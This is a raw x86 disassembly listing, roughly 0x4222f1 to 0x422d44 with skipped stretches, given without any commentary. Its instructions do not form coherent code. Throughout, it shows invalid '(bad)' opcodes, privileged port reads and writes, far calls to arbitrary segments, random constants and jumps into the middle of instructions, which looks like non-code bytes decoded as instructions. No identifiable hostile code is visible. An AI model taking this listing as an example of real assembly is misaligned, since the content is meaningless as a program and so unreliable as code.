  4222f1:	mov    DWORD PTR [edi],ebp
  4222f3:	adc    bh,BYTE PTR [edi-0x1e]
  4222f6:	shr    DWORD PTR [edx-0x3a],1
  4222f9:	or     BYTE PTR [ebp+0x47e5ad42],bl
  4222ff:	repnz mov al,ds:0x95e72424
  422305:	mov    BYTE PTR [eax+0x40],dl
  422308:	arpl   si,bp
  42230a:	adc    al,0x5f
  42230c:	jae    0x42235e
  42230e:	popa   
  42230f:	lods   eax,DWORD PTR ds:[esi]
  422310:	in     eax,0xc7
  422312:	add    eax,0x71c35f18
  422317:	lods   eax,DWORD PTR ds:[esi]
  422318:	mov    cl,BYTE PTR [ebx+edi*2-0x66af0916]
  42231f:	in     al,0x24
  422321:	adc    eax,eax
  422323:	pushf  
  422324:	inc    edi
  422325:	ins    DWORD PTR es:[edi],dx
  422326:	ret    
  422327:	test   BYTE PTR [edi+0x8e0f4aa],bl
  42232d:	push   edi
  42232e:	add    ecx,0xffffffab
  422331:	mov    ebp,0x5a32c6ff
  422336:	leave  
  422337:	xor    DWORD PTR [ecx+0x2b],0x6ec885b8
  42233e:	push   cs
  42233f:	scas   al,BYTE PTR es:[edi]
  422340:	test   BYTE PTR [ecx+0x4c4b4568],bh
  422346:	or     dl,BYTE PTR [edx+0x33]
  422349:	xor    eax,0xb5540374
  42234e:	xor    ah,BYTE PTR [edi-0x6f]
  422351:	inc    ecx
  422352:	push   esi
  422353:	sub    ebx,DWORD PTR fs:[edi-0x3a276129]
  42235a:	retf   
  42235b:	inc    edx
  42235c:	out    0x3e,eax
  42235e:	fisubr WORD PTR [esi+0x9]
  422361:	jo     0x4223ab
  422363:	mov    esp,0xbe135a3f
  422368:	aam    0x9
  42236a:	dec    edx
  42236b:	pop    ebx
  42236c:	mov    edi,0x32d81f45
  422371:	cmp    DWORD PTR [ebx+0x1a8e8d94],0x74050d64
  42237b:	mov    ds:0x6746f491,eax
  422380:	push   cs
  422381:	mov    bl,0xe1
  422383:	mov    edx,ecx
  422385:	hlt    
  422386:	jbe    0x4223c3
  422388:	sti    
  422389:	ins    BYTE PTR es:[edi],dx
  42238a:	jo     0x422367
  42238c:	cmp    eax,0xf141c7d
  422391:	pop    edx
  422392:	je     0x4223db
  422394:	test   BYTE PTR gs:[ebx],0x34
  422398:	add    al,0x5e
  42239a:	xchg   BYTE PTR [ecx],dh
  42239c:	mul    DWORD PTR [eax]
  42239e:	push   edx
  42239f:	out    dx,al
  4223a0:	pop    ebp
  4223a1:	fst    DWORD PTR [esp+esi*2]
  4223a4:	dec    esp
  4223a5:	jno    0x42235e
  4223a7:	fnstenv [esi+0x36]
  4223aa:	dec    ebx
  4223ab:	pop    ss
  4223ac:	jnp    0x422423
  4223ae:	or     BYTE PTR [edx+0x11],dl
  4223b1:	retf   
  4223b2:	addr16 hlt 
  4223b4:	push   ebx
	...
  422415:	add    BYTE PTR [edx-0x7e],dl
  422418:	cs imul edi,esi,0x88bb57ed
  42241f:	adc    eax,0x30d865b6
  422424:	in     al,dx
  422425:	inc    esi
  422426:	sbb    al,0x6c
  422428:	add    DWORD PTR [eax],eax
  42242a:	pop    es
  42242b:	add    DWORD PTR [eax],eax
  42242d:	add    BYTE PTR [edx],ch
  42242f:	lods   eax,DWORD PTR ds:[esi]
  422430:	shr    BYTE PTR [edi+0x55],cl
  422433:	and    eax,DWORD PTR [ecx+0x18a9768a]
  422439:	jb     0x422428
  42243b:	rcl    BYTE PTR [edx],1
  42243d:	sub    bh,cl
  42243f:	test   BYTE PTR [ecx-0x42769e71],ch
  422445:	fcom   DWORD PTR [esi*1-0x26e42d94]
  42244c:	cdq    
  42244d:	retf   
  42244e:	and    DWORD PTR [ecx],esp
  422450:	dec    eax
  422451:	mov    fs,WORD PTR [esp+edi*2]
  422454:	hlt    
  422455:	sbb    esp,eax
  422457:	sub    DWORD PTR [edi+ecx*8-0x2ec7051f],0x68
  42245f:	retf   
  422460:	icebp  
  422461:	ins    BYTE PTR es:[edi],dx
  422462:	pop    edx
  422463:	xchg   edi,eax
  422464:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422465:	jno    0x42248a
  422467:	dec    ecx
  422468:	add    al,0xc2
  42246a:	cwde   
  42246b:	xchg   ecx,eax
  42246c:	addr16 in al,dx
  42246e:	dec    eax
  42246f:	and    edx,esp
  422471:	test   bh,bl
  422473:	cli    
  422474:	in     al,dx
  422475:	jmp    0x422494
  422477:	ficom  DWORD PTR [edi+0x44]
  42247a:	repnz hlt 
  42247c:	mov    ds:0x4bf72bad,eax
  422481:	pop    ss
  422482:	mov    bl,0xd8
  422484:	xchg   ecx,eax
  422485:	xchg   BYTE PTR [eax-0x718a3f4],ch
  42248b:	or     al,BYTE PTR [esi]
  42248d:	or     DWORD PTR [eax+ebp*4],ecx
  422490:	rcl    DWORD PTR [ebx+0x4b],0xad
  422494:	hlt    
  422495:	aas    
  422496:	mov    cs,WORD PTR [esp+edx*1]
  422499:	ror    DWORD PTR ds:0xdc020cd8,0x22
  4224a0:	sub    al,0x5b
  4224a2:	neg    DWORD PTR [ebp+0x73a4dcbc]
  4224a8:	inc    ebx
  4224a9:	mov    ch,0xa4
  4224ab:	jnp    0x42248b
  4224ad:	cld    
  4224ae:	repz sub al,0xe1
  4224b1:	adc    BYTE PTR ds:0x27cc8597,ch
  4224b7:	ror    DWORD PTR [ebp+0x7d2d2973],0xa7
  4224be:	mov    ?,WORD PTR [ebx+0x50]
  4224c1:	sub    al,0x9
  4224c3:	ss rcr dl,1
  4224c6:	cdq    
  4224c7:	xor    DWORD PTR fs:[edx+0x6],0xa9aae9cb
  4224cf:	sbb    al,0x2b
  4224d2:	nop
  4224d3:	xchg   ebp,eax
  4224d4:	push   es
  4224d5:	mov    ch,0x5c
  4224d7:	adc    edi,DWORD PTR ds:0xc50c20a0
  4224dd:	aad    0x31
  4224df:	push   ecx
  4224e0:	rol    DWORD PTR [esi],0x3c
  4224e3:	pop    ds
  4224e4:	ret    0x3c80
  4224e7:	jg     0x4224e7
  4224e9:	inc    ebx
  4224ea:	jns    0x4224cb
  4224ec:	fnstcw WORD PTR [edx-0x35]
  4224ef:	jbe    0x4224e6
  4224f1:	repnz mov ebx,0x7a367bd6
  4224f7:	(bad)  
  4224f8:	cmc    
  4224f9:	mov    edx,0x1f85d12
  4224fe:	addr16 pop ebx
  422500:	jecxz  0x42248a
  422502:	stc    
  422503:	mov    ch,0x35
  422505:	test   eax,0x84b3612e
  42250a:	bound  esp,QWORD PTR [ebx]
  42250c:	std    
  42250d:	cmp    eax,0x4d363e12
  422512:	stos   DWORD PTR es:[edi],eax
  422513:	out    0x3,al
  422515:	push   0xeef4e320
  42251a:	push   ebx
  42251b:	fs jns 0x42256a
  42251e:	lea    edi,ds:0x7ad2ecd6
  422524:	mov    dl,0xcf
  422526:	fidivr WORD PTR [eax]
  422528:	je     0x42253b
  42252a:	test   DWORD PTR [ecx-0x69752846],ebx
  422530:	popfw  
  422532:	pop    esi
  422533:	clc    
  422534:	add    BYTE PTR ds:[eax],al
	...
  422593:	add    BYTE PTR [eax],al
  422595:	add    BYTE PTR [edx-0x40887052],bl
  42259b:	ja     0x422597
  42259d:	out    dx,eax
  42259e:	and    ebx,DWORD PTR [esi]
  4225a0:	outs   dx,DWORD PTR ds:[esi]
  4225a1:	fadd   DWORD PTR [ecx]
  4225a3:	and    al,dh
  4225a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225a6:	and    ebp,DWORD PTR [ebp+0x1]
  4225a9:	add    BYTE PTR [edi],al
  4225ab:	add    DWORD PTR [eax],eax
  4225ad:	add    BYTE PTR [edx+eiz*1-0x69],ch
  4225b1:	rol    edi,0x6
  4225b4:	arpl   bx,si
  4225b6:	shl    BYTE PTR [edx-0x566e14c3],0x6d
  4225bd:	pop    esi
  4225be:	xchg   esp,eax
  4225bf:	shl    DWORD PTR [ebx+eax*8+0x34],0x39
  4225c4:	mov    BYTE PTR [eax+0x750465a3],al
  4225ca:	(bad)  
  4225cb:	sub    DWORD PTR [ecx],ebp
  4225cd:	add    al,0x96
  4225cf:	out    dx,eax
  4225d0:	scas   eax,DWORD PTR es:[edi]
  4225d1:	cld    
  4225d2:	inc    ecx
  4225d3:	cmp    DWORD PTR [edx-0x37],esp
  4225d6:	idiv   ah
  4225d8:	push   ss
  4225d9:	adc    ch,bh
  4225db:	ret    
  4225dc:	(bad)  
  4225dd:	sahf   
  4225de:	push   esi
  4225df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225e0:	push   eax
  4225e1:	inc    edx
  4225e2:	xor    dl,ch
  4225e4:	dec    eax
  4225e5:	shr    BYTE PTR [esi],cl
  4225e7:	ds adc DWORD PTR ds:[edi],ecx
  4225eb:	dec    edx
  4225ec:	mov    edi,DWORD PTR [esi]
  4225ee:	sub    BYTE PTR [esi-0x72],ch
  4225f1:	jg     0x4225d2
  4225f3:	clc    
  4225f4:	data16 xchg BYTE PTR [edi-0x4339525],ah
  4225fb:	and    ebp,DWORD PTR [ecx+ebx*2-0x57]
  4225ff:	ja     0x422677
  422601:	dec    DWORD PTR [eax-0x41d4dbca]
  422607:	shl    DWORD PTR [edx-0x582a56df],0x59
  42260e:	clc    
  42260f:	mov    eax,0xe96fe444
  422614:	fbld   TBYTE PTR [edx-0x1b707a7d]
  42261a:	add    edi,esp
  42261c:	call   0xfbbb:0x85fc8290
  422623:	xlat   BYTE PTR ds:[ebx]
  422624:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422625:	xchg   ebp,eax
  422626:	mov    eax,ds:0xe6cd5c24
  42262b:	jle    0x4225f3
  42262d:	sub    DWORD PTR [ebp-0x35],0x51
  422631:	mov    edi,0xa7120493
  422636:	inc    edx
  422637:	jmp    0x42267b
  422639:	push   edi
  42263a:	dec    esp
  42263b:	mov    ds:0xdc0e40cf,eax
  422640:	stc    
  422641:	test   DWORD PTR [ebp-0x579dff5d],esi
  422647:	cdq    
  422648:	sub    bl,0x96
  42264b:	push   ds
  42264c:	call   0x6a34:0xbaaaa3a3
  422653:	mov    dh,0x1a
  422655:	pushf  
  422656:	jmp    FWORD PTR [esi]
  422658:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422659:	aam    0xeb
  42265b:	xchg   ebp,eax
  42265c:	aas    
  42265d:	xchg   BYTE PTR [ecx],bl
  42265f:	shr    BYTE PTR gs:[ecx+0x2fe8676e],0x2f
  422667:	jb     0x4226ca
  422669:	loop   0x42269c
  42266b:	and    ax,0x9eb1
  42266f:	dec    eax
  422670:	scas   al,BYTE PTR es:[edi]
  422671:	leave  
  422672:	xor    BYTE PTR [edx-0xe],0xe1
  422676:	cwde   
  422677:	and    DWORD PTR [edx],esi
  422679:	jno    0x422617
  42267b:	aam    0x81
  42267d:	sub    al,0x5e
  42267f:	pushf  
  422680:	(bad)  
  422681:	dec    ebp
  422682:	and    al,0x33
  422684:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422685:	sub    dh,BYTE PTR [ebp-0x5e4675da]
  42268b:	in     eax,0x9c
  42268d:	stos   BYTE PTR es:[edi],al
  42268e:	stc    
  42268f:	add    BYTE PTR [ecx+0x53],bl
  422692:	mov    ch,0xef
  422694:	adc    BYTE PTR [esi+0x2b9e9e14],cl
  42269a:	test   DWORD PTR [esi+0x41],0x444319af
  4226a1:	and    DWORD PTR [edx+0x1],esi
  4226a4:	pop    eax
  4226a5:	add    BYTE PTR [edx+0x2d934d83],ah
  4226ab:	inc    ebp
  4226ac:	stc    
  4226ad:	xor    esi,DWORD PTR [edx]
  4226af:	push   cs
  4226b0:	mov    ah,0xd9
  4226b2:	xchg   ebp,eax
  4226b3:	fidivr DWORD PTR [edi]
	...
  422715:	add    BYTE PTR [edi],ah
  422717:	sub    eax,0x7d7f2d7d
  42271c:	ja     0x42274d
  42271e:	aad    0x21
  422720:	add    al,0x2f
  422722:	sub    cl,BYTE PTR [ebx]
  422724:	jl     0x4226c8
  422726:	sub    ch,BYTE PTR [esi+0x1]
  422729:	add    BYTE PTR [edi],al
  42272b:	add    DWORD PTR [eax],eax
  42272d:	add    BYTE PTR [edi+0x28],bh
  422730:	pop    ss
  422731:	pop    edx
  422732:	jnp    0x422748
  422734:	sbb    esi,edi
  422736:	xor    ebp,DWORD PTR [ecx+0x1acbd82a]
  42273c:	add    esp,ebx
  42273e:	xor    bl,BYTE PTR [ebx+0x230e2523]
  422744:	inc    eax
  422745:	or     BYTE PTR [esi+0x63ec9369],0x1b
  42274c:	mov    ds:0x884fc426,al
  422751:	shl    edx,cl
  422753:	clc    
  422754:	or     eax,0x187d0c7f
  422759:	xor    BYTE PTR [ecx],bl
  42275b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42275c:	inc    esi
  42275d:	in     eax,0x99
  42275f:	sbb    ecx,edi
  422761:	in     eax,0x2b
  422763:	fstp   TBYTE PTR [eax]
  422765:	push   ebx
  422766:	inc    ax
  422768:	scas   eax,DWORD PTR es:[edi]
  422769:	push   esp
  42276a:	push   ebx
  42276b:	mov    eax,0x84bd174e
  422770:	je     0x422798
  422772:	scas   eax,DWORD PTR es:[edi]
  422773:	int3   
  422774:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422775:	mov    ebp,0xcd0ee418
  42277a:	popa   
  42277b:	push   eax
  42277c:	sub    al,0x4e
  42277e:	sub    BYTE PTR [edi-0x7d50a632],bl
  422784:	adc    bl,BYTE PTR [ecx]
  422786:	add    BYTE PTR [ebp+0x54b4d15a],dl
  42278c:	pop    ebx
  42278d:	inc    ebx
  42278e:	adc    eax,0x60ab5c05
  422793:	fwait
  422794:	mov    WORD PTR [esi-0x13c345fa],ss
  42279a:	enter  0xb553,0xdd
  42279e:	inc    esi
  42279f:	mov    esp,0x37aa6ea0
  4227a4:	pop    edi
  4227a5:	pop    ebp
  4227a6:	mov    esi,0x444a7d96
  4227ab:	popf   
  4227ac:	cmp    bh,bh
  4227ae:	cmp    ebx,edx
  4227b0:	sbb    cl,BYTE PTR [ecx]
  4227b2:	(bad)  
  4227b3:	ja     0x42281a
  4227b5:	loop   0x42277f
  4227b7:	test   BYTE PTR [eax+edx*1],0x1d
  4227bb:	fs out 0xe,al
  4227be:	cli    
  4227bf:	outs   dx,BYTE PTR ds:[esi]
  4227c0:	out    dx,al
  4227c1:	(bad)  
  4227c2:	sub    al,0x17
  4227c4:	daa    
  4227c5:	adc    bh,ah
  4227c7:	cmp    DWORD PTR [ebx-0xb6e12a9],esp
  4227cd:	add    al,dl
  4227cf:	lds    esi,FWORD PTR [ebx+0x3cc075]
  4227d5:	imul   ebp,esp,0x12
  4227d8:	sbb    BYTE PTR [ecx+0x19],ch
  4227db:	imul   ecx,DWORD PTR [eax-0x20a422d6],0xffffff86
  4227e2:	ret    0xc8b
  4227e5:	fnstsw WORD PTR [esi-0x3baa48d]
  4227eb:	and    BYTE PTR [edx-0x21],bl
  4227ee:	add    ah,BYTE PTR [ebp+0x6fe7b7f]
  4227f4:	retf   
  4227f5:	jae    0x4227ba
  4227f7:	loopne 0x4227a5
  4227f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227fa:	and    dl,ch
  4227fc:	push   cs
  4227fd:	xchg   DWORD PTR [ebp+0x5a146921],ebx
  422803:	sbb    dh,cl
  422805:	cmc    
  422806:	pop    es
  422807:	je     0x4227de
  422809:	pop    ss
  42280a:	push   es
  42280b:	call   0x8350:0x5bfd1aa6
  422812:	push   es
  422813:	mov    ecx,0x140ee02
  422818:	sbb    DWORD PTR [eax+0x6c],edx
  42281b:	pop    ebx
  42281c:	dec    edx
  42281d:	xlat   BYTE PTR ds:[ebx]
  42281f:	(bad)  
  422820:	xchg   ebx,eax
  422821:	int    0xe3
  422823:	dec    ebp
  422824:	pop    es
  422825:	test   al,0xdc
  422827:	cmp    esi,DWORD PTR [esi]
  422829:	faddp  st(6),st
  42282b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42282c:	xchg   ecx,eax
  42282d:	prefetchw BYTE PTR [esi]
  422830:	mov    cl,0xb
  422832:	xlat   BYTE PTR ds:[ebx]
  422833:	lahf   
  422834:	mov    ah,0x0
	...
  422896:	int    0x39
  422898:	mov    eax,0xef97fc97
  42289d:	jnp    0x42284b
  42289f:	inc    ebx
  4228a0:	cmp    bl,BYTE PTR [esp]
  4228a3:	push   es
  4228a4:	sbb    DWORD PTR [edi+0x16f31],ecx
  4228aa:	pop    es
  4228ab:	add    DWORD PTR [eax],eax
  4228ad:	add    BYTE PTR [ebx-0x28],cl
  4228b0:	les    esi,FWORD PTR [ebp-0x7cccc450]
  4228b6:	cli    
  4228b7:	and    eax,0x88455950
  4228bc:	retf   0xfb01
  4228bf:	out    0x84,al
  4228c1:	aad    0x77
  4228c3:	scas   eax,DWORD PTR es:[edi]
  4228c4:	mov    eax,0x5321d908
  4228c9:	push   0xffffff95
  4228cb:	test   BYTE PTR [esi+0x65dea8e6],bh
  4228d1:	mov    edx,0x1392ae69
  4228d6:	adc    bh,BYTE PTR [ebx+0x55]
  4228d9:	in     al,dx
  4228da:	or     al,0x9d
  4228dc:	shr    DWORD PTR [esi],0x84
  4228df:	xchg   esi,eax
  4228e0:	cdq    
  4228e1:	jnp    0x42288d
  4228e3:	das    
  4228e4:	add    dh,BYTE PTR [esi-0x49061e43]
  4228ea:	dec    ecx
  4228eb:	sub    al,0x4c
  4228ed:	inc    ecx
  4228ee:	sub    bh,BYTE PTR [ebx+0x78]
  4228f1:	or     ch,BYTE PTR [eax+0x49]
  4228f4:	test   DWORD PTR [ebp+0x14603d84],edx
  4228fa:	clc    
  4228fb:	xchg   ebp,eax
  4228fc:	rcl    DWORD PTR [esi-0x27],1
  4228ff:	imul   esi,DWORD PTR [ebx-0x7e],0xc2acce63
  422906:	stos   BYTE PTR es:[edi],al
  422907:	and    DWORD PTR [esi+0x2d],esp
  42290a:	aas    
  42290b:	(bad)  
  42290c:	mov    esp,0x929bab17
  422911:	psllq  mm2,QWORD PTR [ebx+0x29a9d087]
  422918:	aad    0x9
  42291a:	xor    bl,BYTE PTR [eax+ecx*2]
  42291d:	push   ebx
  42291e:	push   0xfffffffa
  422920:	lods   eax,DWORD PTR ds:[esi]
  422921:	xlat   BYTE PTR ds:[ebx]
  422922:	pop    edx
  422923:	out    0x3e,eax
  422925:	rol    cl,1
  422927:	dec    esi
  422928:	push   esi
  422929:	test   dl,dl
  42292b:	mov    al,ds:0x88172ff7
  422930:	mov    ch,0x90
  422932:	ror    DWORD PTR [esi+0x52d8b95e],0x93
  422939:	sbb    al,ch
  42293b:	mov    edi,0x8a2a5d88
  422940:	dec    ebp
  422941:	cs icebp 
  422943:	xchg   ebp,eax
  422944:	cld    
  422945:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422946:	scas   eax,DWORD PTR es:[edi]
  422947:	fnsave [edi-0x22a52866]
  42294d:	fistp  WORD PTR [ebp-0x621bd70b]
  422953:	cmp    BYTE PTR fs:[ebp-0x10],dl
  422957:	mov    BYTE PTR [esi+0x2c48ac0],al
  42295d:	xchg   esp,eax
  42295e:	das    
  42295f:	jge    0x422923
  422961:	add    al,0x52
  422963:	mov    bh,0x0
  422965:	popf   
  422966:	and    DWORD PTR [ebp+0x40],edx
  422969:	loope  0x422910
  42296b:	stos   DWORD PTR es:[edi],eax
  42296c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42296d:	inc    eax
  42296e:	stos   BYTE PTR es:[edi],al
  42296f:	loop   0x4229db
  422971:	mov    bl,0xf4
  422973:	repnz repnz imul ebp,edi,0xb5d57430
  42297b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42297c:	jmp    0x62c27a3
  422981:	sbb    al,0x99
  422983:	mov    BYTE PTR [edx-0x7fdfd92],cl
  422989:	lods   al,BYTE PTR ds:[esi]
  42298a:	lods   al,BYTE PTR ds:[esi]
  42298b:	(bad)
  422990:	ret    0x68f5
  422993:	mov    eax,ds:0x276bf3d0
  422998:	shl    DWORD PTR [esi+0x44bea977],cl
  42299e:	push   es
  42299f:	fcom   DWORD PTR [ebx-0x166702a1]
  4229a5:	out    dx,eax
  4229a6:	mov    ch,0xc3
  4229a8:	mov    ecx,0xb87bd452
  4229ad:	test   al,0xbd
  4229af:	mov    al,ds:0x91d397b8
  4229b4:	inc    ebp
	...
  422a15:	add    BYTE PTR [esi-0x377e796],dl
  422a1b:	cli    
  422a1c:	xchg   esi,eax
  422a1d:	jle    0x422a63
  422a1f:	rol    ecx,1
  422a21:	call   0xe2f09914
  422a26:	cmp    BYTE PTR [eax+0x1],dh
  422a29:	add    BYTE PTR [edi],al
  422a2b:	add    DWORD PTR [eax],eax
  422a2d:	add    BYTE PTR [edx],dl
  422a2f:	push   edi
  422a30:	jl     0x4229cd
  422a32:	mov    bh,0xb8
  422a34:	loopne 0x422a92
  422a36:	sar    edi,cl
  422a38:	fdivr  DWORD PTR [eax]
  422a3a:	aas    
  422a3b:	jne    0x4229e8
  422a3d:	mov    dl,0x15
  422a3f:	retf   0x54ee
  422a42:	imul   edx,DWORD PTR [ecx+0x4b368da6],0x56
  422a49:	stos   BYTE PTR es:[edi],al
  422a4a:	cmp    al,0x6e
  422a4c:	sbb    BYTE PTR [ebx+0x61367e12],ah
  422a52:	dec    esi
  422a53:	test   BYTE PTR [eax+0x721947a9],bh
  422a59:	lahf   
  422a5a:	push   0x1f
  422a5c:	les    ecx,FWORD PTR [ebx-0x5bfbb619]
  422a62:	dec    edi
  422a63:	or     dl,BYTE PTR [ebx]
  422a65:	jnp    0x4229f2
  422a67:	scas   al,BYTE PTR es:[edi]
  422a68:	test   al,0x66
  422a6a:	cmp    dl,al
  422a6c:	fsubr  st,st(2)
  422a6e:	jne    0x4229fe
  422a70:	or     cl,BYTE PTR [esi+0x566c11af]
  422a76:	push   edx
  422a77:	ja     0x422a01
  422a79:	inc    esi
  422a7a:	adc    dh,BYTE PTR [ecx-0x27c8c3d9]
  422a80:	inc    edx
  422a81:	hlt    
  422a82:	add    eax,0xc97cb15a
  422a87:	scas   eax,DWORD PTR es:[edi]
  422a88:	xchg   edi,eax
  422a89:	ret    
  422a8a:	xor    DWORD PTR [esi-0x45],edx
  422a8d:	jecxz  0x422a9a
  422a8f:	dec    ebp
  422a90:	adc    eax,0x9c53464a
  422a95:	leave  
  422a96:	jmp    0x7e67cb36
  422a9b:	ds in  eax,dx
  422a9d:	js     0x422b11
  422a9f:	std    
  422aa0:	pop    ss
  422aa1:	lock xchg ecx,eax
  422aa3:	(bad)  [eax-0x4bde5795]
  422aa9:	push   ds
  422aaa:	jmp    0x422a58
  422aac:	sahf   
  422aad:	add    DWORD PTR ds:0x226acfa3,esp
  422ab3:	out    0xa1,al
  422ab5:	jae    0x422aa1
  422ab7:	mov    edx,esi
  422ab9:	mov    cl,0x89
  422abb:	ds test eax,0x3864a1cc
  422ac1:	xchg   edi,eax
  422ac2:	push   eax
  422ac3:	out    0x15,eax
  422ac5:	and    bl,dl
  422ac7:	js     0x422a51
  422ac9:	add    BYTE PTR [edx+0xf751861],bh
  422acf:	dec    esp
  422ad0:	mov    ebp,0xd2ba96ff
  422ad5:	pop    ss
  422ad6:	adc    eax,DWORD PTR [esi-0x25b5c46d]
  422adc:	dec    esi
  422add:	ja     0x422b42
  422adf:	pop    edi
  422ae0:	push   0x39c63ce2
  422ae5:	and    ebp,DWORD PTR [ecx-0x50dbd296]
  422aeb:	pop    esi
  422aec:	mov    dh,0x32
  422aee:	mov    dh,0xfd
  422af0:	or     bh,BYTE PTR [edx]
  422af2:	imul   esp,DWORD PTR [edi+0x30],0xffffff9b
  422af6:	sti    
  422af7:	fcom   DWORD PTR [ebx+ebx*2+0x77]
  422afb:	add    eax,0x3aa2796d
  422b00:	pusha  
  422b01:	sbb    al,0x22
  422b03:	in     eax,0x59
  422b05:	xchg   edx,eax
  422b06:	or     al,0x35
  422b08:	jmp    0xddd7:0x5f1fe22d
  422b0f:	cs pop edi
  422b11:	aad    0xab
  422b13:	jle    0x422b39
  422b15:	mov    eax,0xd1f34be8
  422b1a:	jnp    0x422b40
  422b1c:	jne    0x422acf
  422b1e:	stc    
  422b1f:	jl     0x422b2c
  422b21:	ret    
  422b22:	aad    0x6d
  422b24:	ret    
  422b25:	and    esp,ebx
  422b27:	dec    ebp
  422b28:	ret    0x668e
  422b2b:	xchg   ebp,eax
  422b2c:	xchg   ecx,eax
  422b2d:	xchg   ecx,eax
  422b2e:	ret    0x67d0
  422b31:	jo     0x422ba5
  422b33:	jge    0x422b2a
	...
  422b95:	add    BYTE PTR [edi+esi*1+0x4a],al
  422b99:	fwait
  422b9a:	jnp    0x422b9b
  422b9c:	aad    0xff
  422b9e:	push   cs
  422b9f:	adc    ebx,DWORD PTR [ecx-0x36c4d6e4]
  422ba5:	sub    DWORD PTR [edi],edi
  422ba7:	jno    0x422baa
  422ba9:	add    BYTE PTR [edi],al
  422bab:	add    DWORD PTR [eax],eax
  422bad:	add    BYTE PTR [edi-0x4b17ec04],bh
  422bb3:	cwde   
  422bb4:	in     al,0x3a
  422bb6:	loop   0x422b72
  422bb8:	mov    bl,0xdf
  422bba:	jecxz  0x422bdb
  422bbc:	leave  
  422bbd:	push   ebx
  422bbe:	into   
  422bbf:	xchg   DWORD PTR [ecx],ebp
  422bc1:	mov    dl,0x92
  422bc3:	test   ch,0x7a
  422bc6:	mov    bl,0x42
  422bc8:	pop    eax
  422bc9:	pop    esp
  422bca:	(bad)  
  422bcb:	mov    al,0x81
  422bcd:	xchg   al,al
  422bcf:	dec    edi
  422bd0:	inc    ebx
  422bd1:	mov    al,0xcc
  422bd3:	sbb    eax,0x638f8ad4
  422bd8:	cwde   
  422bd9:	mov    BYTE PTR [eax-0xd],0xca
  422bdd:	jno    0x422bf1
  422bdf:	push   edi
  422be0:	fld    QWORD PTR [ecx+0x37]
  422be3:	mov    esp,0x914373ae
  422be8:	jb     0x422c37
  422bea:	loop   0x422c34
  422bec:	dec    edx
  422bed:	es fs imul edi,edx,0x16783363
  422bf5:	sub    DWORD PTR [ecx-0x7e],0x17e59d80
  422bfc:	(bad)  
  422bfd:	adc    edi,DWORD PTR cs:[edi+0x2d]
  422c01:	cld    
  422c02:	popf   
  422c03:	and    al,0xef
  422c05:	in     eax,0xac
  422c07:	mov    eax,ds:0xe74756c8
  422c0c:	xchg   edi,eax
  422c0d:	xor    ebp,DWORD PTR ds:[bx+si-0x52]
  422c12:	mov    bl,0xc6
  422c14:	and    al,BYTE PTR ss:[edx+0x6d2895c2]
  422c1b:	sub    DWORD PTR [ebp+0x77],ecx
  422c1e:	push   ebp
  422c1f:	fiadd  DWORD PTR [edx+0x4b]
  422c22:	test   al,0xc9
  422c24:	scas   eax,DWORD PTR es:[edi]
  422c25:	inc    ebx
  422c26:	sub    BYTE PTR ds:0x62724539,al
  422c2c:	bound  edi,QWORD PTR [esp+eax*8+0x204d22f2]
  422c33:	sbb    BYTE PTR [ebp+0x3fb086cd],al
  422c39:	rcl    ecx,0xd1
  422c3c:	cdq    
  422c3d:	push   0xd
  422c3f:	popa   
  422c40:	test   eax,0xbbc738bb
  422c45:	adc    esi,DWORD PTR fs:[eax+0x54e99dbe]
  422c4c:	into   
  422c4d:	aam    0xc5
  422c4f:	rol    DWORD PTR [esi],cl
  422c51:	out    dx,eax
  422c52:	lods   eax,DWORD PTR ds:[esi]
  422c53:	sbb    cl,bl
  422c55:	shl    DWORD PTR [ebp+0x22f8056d],0xbc
  422c5c:	push   edx
  422c5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c5e:	jne    0x422c42
  422c60:	jae    0x422ca6
  422c62:	pop    eax
  422c63:	rol    BYTE PTR [edi],1
  422c65:	nop
  422c66:	test   BYTE PTR [ebp-0x359c2bc0],bl
  422c6c:	cmp    eax,0x438feb74
  422c71:	outs   dx,BYTE PTR ds:[esi]
  422c72:	adc    eax,0x326af6e4
  422c77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c78:	add    ebx,DWORD PTR [ebx]
  422c7a:	sub    cl,BYTE PTR [esi]
  422c7c:	stc    
  422c7d:	ins    DWORD PTR es:[edi],dx
  422c7e:	mov    eax,0xca72171
  422c83:	cld    
  422c84:	sbb    ah,BYTE PTR [edi+0x3d]
  422c87:	sub    BYTE PTR [di+0xb],bl
  422c8b:	mov    edi,0xf1cceecd
  422c90:	push   eax
  422c91:	inc    ecx
  422c92:	(bad)  
  422c93:	jns    0x422ca9
  422c95:	pop    edx
  422c96:	pushf  
  422c97:	pop    ss
  422c98:	in     eax,0x13
  422c9a:	test   eax,0x97e39357
  422c9f:	xor    al,0xeb
  422ca1:	mov    al,ds:0x8c577ee9
  422ca6:	stos   DWORD PTR es:[edi],eax
  422ca7:	and    al,0x1f
  422ca9:	inc    ebx
  422caa:	pop    es
  422cab:	out    dx,eax
  422cac:	sub    edi,esp
  422cae:	xchg   ecx,eax
  422caf:	data16 aas 
  422cb1:	adc    eax,0x1c0a71
	...
  422d16:	mov    edi,0x626d60bd
  422d1b:	std    
  422d1c:	mov    edi,0x26c593ff
  422d21:	fild   WORD PTR [ebx+0x8]
  422d24:	mov    al,ds:0x1724609
  422d29:	add    BYTE PTR [edi],al
  422d2b:	add    DWORD PTR [eax],eax
  422d2d:	add    al,dh
  422d2f:	and    eax,0x19f6cd15
  422d34:	cmp    al,0x95
  422d36:	out    dx,eax
  422d37:	test   al,0x27
  422d39:	mov    al,BYTE PTR [eax-0x64]
  422d3c:	pop    ss
  422d3d:	inc    ecx
  422d3e:	sbb    DWORD PTR [eax],ecx
  422d40:	cld    
  422d41:	ret    0x9d9b
  422d44:	gs sbb dl,ah
